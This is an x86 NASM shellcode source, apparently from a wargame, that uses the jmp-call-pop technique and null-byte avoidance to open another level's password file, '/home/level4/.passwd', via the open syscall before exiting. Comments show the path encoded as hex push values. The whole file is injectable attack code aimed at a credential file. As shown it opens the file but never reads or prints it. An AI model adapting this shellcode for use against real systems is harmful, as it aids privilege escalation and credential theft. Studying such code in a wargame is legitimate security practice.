        
	; /home/level4/.passwd,0
	;
	; /hom		
	; e/le
	; vel4
	; /.pa
	; sswd
	; 0000
	;
	; 0000		
	; sswd		dwss		64777373
	; /.pa		ap./		61702e2f
	; vel4		4lev		346c6576
	; e/le		el/e		656c2f65
	; /hom		moh/		6d6f682f


	SECTION .text           ; code section
        global main             ; make label available to linker as invoked by gcc
        global _start           ; make label available to linker w/ default entry
main:                           ; standard  gcc  entry point
_start:
	xor ebx,ebx		; filename	
	xor ecx,ecx		; flags, O_RDONLY = 0
	xor edx,edx		; mode

	jmp short ender
	
	starter:

	pop ebx			; tricky pop
	xor eax,eax		; clean up registers
	mov byte [ebx+20], al	; NUL byte
	mov al, 5		; syscall for open
	int 0x80		; enter kernel mode

	exit:
	xor eax,eax		; clean up registers
	mov al, 1		; exit
	xor ebx,ebx		; clean up registers or exit status 0
	int 0x80		; enter kernel mode

	ender:
	call starter		; put the address of the string on the stack
	db '/home/level4/.passwd#'
